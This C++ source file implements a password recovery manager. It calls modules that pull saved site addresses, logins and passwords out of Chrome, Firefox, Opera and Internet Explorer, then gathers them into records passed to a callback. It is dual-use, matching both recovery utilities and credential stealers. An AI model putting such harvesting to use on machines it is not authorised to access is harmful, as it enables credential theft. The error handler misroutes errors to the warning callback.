#include "stdafx.h"
#include "PasswordRecoveryManager.h"

CPasswordRecoveryManager::CPasswordRecoveryManager(IPasswordRecoveryCallback* pCallback)
	: m_pPasswordRecoveryCallback(pCallback)
	, m_pChromePasswordRecovery(new CChromePasswordRecovery)
	, m_pFirefoxPasswordRecovery(new CFirefoxPasswordRecovery)
	, m_pOperaPasswordRecovery(new COperaPasswordRecovery)
	, m_pInternetExplorerPasswordRecovery(new CInternetExplorerPasswordRecovery)
{

}

CPasswordRecoveryManager::~CPasswordRecoveryManager()
{
	if(m_pInternetExplorerPasswordRecovery)
	{
		delete m_pInternetExplorerPasswordRecovery;
		m_pInternetExplorerPasswordRecovery = NULL;
	}

	if(m_pOperaPasswordRecovery)
	{
		delete m_pOperaPasswordRecovery;
		m_pOperaPasswordRecovery = NULL;
	}

	if(m_pFirefoxPasswordRecovery)
	{
		delete m_pFirefoxPasswordRecovery;
		m_pFirefoxPasswordRecovery = NULL;
	}

	if(m_pChromePasswordRecovery)
	{
		delete m_pChromePasswordRecovery;
		m_pChromePasswordRecovery = NULL;
	}

	m_pPasswordRecoveryCallback = NULL;
}

CPasswordRecords& CPasswordRecoveryManager::GetPasswordRecords()
{
	return m_cPasswordRecords;
}

void CPasswordRecoveryManager::DoRecovery()
{
	OnRecoveryStart();

	DoRecoveryChrome(this);

	DoRecoveryFirefox(this);

	DoRecoveryOpera(this);

	DoRecoveryInternetExplorer(this);

	OnRecoveryComplete();
}

void CPasswordRecoveryManager::DoRecoveryChrome(IPasswordRecoveryCallback* pCallback)
{
	if(m_pChromePasswordRecovery == NULL)
		return;

	m_pChromePasswordRecovery->DoRecovery(pCallback);
}

void CPasswordRecoveryManager::DoRecoveryFirefox(IPasswordRecoveryCallback* pCallback)
{
	if(m_pFirefoxPasswordRecovery == NULL)
		return;

	m_pFirefoxPasswordRecovery->DoRecovery(pCallback);
}

void CPasswordRecoveryManager::DoRecoveryOpera(IPasswordRecoveryCallback* pCallback)
{
	if(m_pOperaPasswordRecovery == NULL)
		return;

	m_pOperaPasswordRecovery->DoRecovery(pCallback);
}

void CPasswordRecoveryManager::DoRecoveryInternetExplorer(IPasswordRecoveryCallback* pCallback)
{
	if(m_pInternetExplorerPasswordRecovery == NULL)
		return;

	m_pInternetExplorerPasswordRecovery->DoRecovery(pCallback);
}

void CPasswordRecoveryManager::OnRecoveryStart()
{
	if(m_pPasswordRecoveryCallback)
	{
		m_pPasswordRecoveryCallback->OnRecoveryStart();
	}
}

void CPasswordRecoveryManager::OnRecoveryRecord(LPCTSTR lpszSiteAddress, LPCTSTR lpszLogin, LPCTSTR lpszPassword, LONG nDateCreated)
{
	m_cPasswordRecords.Add(lpszSiteAddress, lpszLogin, lpszPassword, nDateCreated);

	if(m_pPasswordRecoveryCallback)
	{
		m_pPasswordRecoveryCallback->OnRecoveryRecord(lpszSiteAddress, lpszLogin, lpszPassword, nDateCreated);
	}
}

void CPasswordRecoveryManager::OnRecoveryComplete()
{
	if(m_pPasswordRecoveryCallback)
	{
		m_pPasswordRecoveryCallback->OnRecoveryComplete();
	}
}

void CPasswordRecoveryManager::OnRecoveryWarning(LPCTSTR lpszMessage)
{
	if(m_pPasswordRecoveryCallback)
	{
		m_pPasswordRecoveryCallback->OnRecoveryWarning(lpszMessage);
	}
}

void CPasswordRecoveryManager::OnRecoveryError(LPCTSTR lpszMessage)
{
	if(m_pPasswordRecoveryCallback)
	{
		m_pPasswordRecoveryCallback->OnRecoveryWarning(lpszMessage);
	}
}